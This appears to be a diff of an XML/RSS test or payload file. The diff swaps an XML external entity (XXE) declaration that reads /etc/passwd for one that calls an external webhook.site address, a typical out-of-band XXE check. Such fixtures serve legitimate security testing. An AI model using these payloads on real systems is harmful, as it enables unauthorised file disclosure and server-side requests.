@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe SYSTEM "https://webhook.site/79da135d-7a92-498e-9887-50669f5c9571">
 ]>
 <rss>
   <channel>
